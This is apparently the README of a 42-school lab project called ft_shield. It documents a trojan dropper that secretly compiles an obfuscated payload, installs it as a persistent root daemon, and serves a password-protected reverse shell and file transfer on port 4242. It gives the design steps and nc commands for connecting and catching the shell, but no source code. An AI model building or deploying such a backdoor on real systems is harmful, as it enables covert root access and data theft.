# Ft_shield

## Overview

This project is about creating a simple `trojan horse`, a type of malware that appears legitimate but contains a malicious payload. The program is divided into two parts: a "dropper" and a "payload" `the daemon`.

The dropper is the initial program run by the user. It appears harmless, only printing a login. In the background, it secretly compiles and installs its own payload (an embedded C source code) as a new binary, `ft_shield`, in a system directory `/bin/ft_shield`.

The goal is to achieve persistence by creating a system service that launches the payload as a root daemon on boot. then listens on a port, providing a hidden, password-protected reverse shell.

## Key Features

The project is written in **C** and runs in a **Debian** VM managed by **Vagrant**. Its core features include being a **Quine**, embedding its own complete source code as an obfuscated hex array. When run, this dropper **reproduces itself** by decrypting and writing this source code to a new file, which it then **compiles **cc** and **strip**s** at runtime to create the payload binary. It achieves **persistence** by creating a systemd service **/etc/init.d/ft_shield** to launch the payload as a root daemon on boot. The daemon listens on port **4242**, handling up to **3** clients using **poll()**. For stealth, all sensitive strings are encrypted with **RC4** and decrypted in memory. Authentication is secured using a **DJB2 hash** comparison, and the primary function is to provide a **root reverse shell** to authenticated clients.

## Getting Started

To start the project, run the following commands:

```bash
git clone git@github.com:whoismtrx/42_ft_shield.git ft_shield
cd ft_shield
```

To launch and provision the virtual machine:

```bash
make up
```

To connect to the VM via SSH:

```bash
make ssh
```

## Usage

Inside the VM, navigate to the synced folder and run `make`:

```bash
cd /home/vagrant/ft_shield
make
```

-----

**1. Run the Dropper (as root)**

This installs and starts the daemon service. It will only print your login, as required by the subject.

```bash
sudo ./ft_shield
```

-----

**2. Connect to the Daemon**

From another terminal, connect to the VM's IP on port 4242.

```bash
nc 192.168.56.20 4242
```

-----

**3. Authenticate & Interact**

You will be prompted for the password. Once authenticated, you can use the following commands:

```bash
Please enter your password: 1234
ft_shield $> help
Commands:
    help - ?                           :     Shows this help message
    exit                               :     Close current client connection
    quine                              :     Testing for valid quine
    shell <IPV4 ADDRESS> <PORT>        :     Create a reverse shell connection
    send <IPV4 ADDRESS> <PORT> <FILE PATH> :     Send a file from the target machine
    receive <FILE PATH>                :     Receive a file in the target machine
ft_shield $>
```

**Example: Getting a Reverse Shell**

(On your listener machine): `nc -lvk 9001`

(On the client terminal):

```bash
ft_shield $> shell 192.168.56.1 9001
Creating a reverse shell connection ...
Reverse shell created successfully!
```

## Implementation

This project is a deep dive into C programming, system services, and basic malware design. The implementation is split into two main parts.

### The Dropper

The initial `ft_shield` binary is the dropper. Its main job is to install the payload. It contains the payload's source code in a large, encrypted C array (`srccode[]`). When executed with root rights, it performs several actions:

1.  **Reproduces Itself (Quine):** It decrypts (`RC4`) and writes its own embedded `srccode[]` array into a temporary C file, perfectly recreating its source code for the new payload.
2.  **Compiles Payload:** It calls `system()` to compile this new C file with `cc` and `strip`s the symbols from the resulting binary to make it smaller and harder to analyze.
3.  **Installs Payload:** It moves the new binary to `/bin/ft_shield`.
4.  **Establishes Persistence:** It creates a systemd service file at `/etc/init.d/ft_shield`. This service is configured to run `/bin/ft_shield` on boot.
5.  **Starts Service:** It uses `systemctl` to reload, enable, and start the new service.

### The Payload (Daemon)

The `/bin/ft_shield` binary is the payload.

1.  **Daemonization:** Its first action is to `fork()`, create a new session with `setsid()`, and `chdir()` to `/`, turning itself into a background daemon.
2.  **Network Server:** It binds to port `4242` and listens for connections. It uses `poll()` to handle up to 3 clients simultaneously.
3.  **Authentication:** Clients must provide a password. The input is hashed with `DJB2` and compared against a hardcoded hash (`paschecksum`). This avoids storing the password in plaintext.
4.  **Command Handler:** Once authenticated, the daemon provides a prompt (`$>`). It parses client commands to provide features like `help`, `exit`, `quine`, `shell`, `send`, and `receive`.
5.  **Reverse Shell:** The `shell <ip> <port>` command forks the daemon. The child process creates a new socket, connects back to the client's specified IP/port, and uses `dup2()` to redirect `stdin`, `stdout`, and `stderr` to the socket before executing `/bin/bash`.

## Resources

  * [Quines (self-replicating programs)](http://www.madore.org/~david/computers/quine.html)
  * [Reverse Shell Generator](https://www.revshells.com/)
  * [RC4 Stream Cipher](https://www.youtube.com/watch?v=wW3WOLX4itc)
  * [DJB2 Hash Function](https://theartincode.stanis.me/008-djb2/)

## Project Structure

```
ft_shield/
├── main.c                  # Dropper/payload source (318KB with embedded code)
├── Makefile                # Build automation with VM management
├── Vagrantfile             # Debian Bullseye VM configuration
├── setup.sh                # VM initialization script
├── ft_shield.gif           # Demo animation
└── README.md               # Documentation
```

## Disclaimer

This repository is for educational purposes only, documenting my work on the 42 curriculum. These solutions are intended as a reference for students who have already completed or are actively working on the project.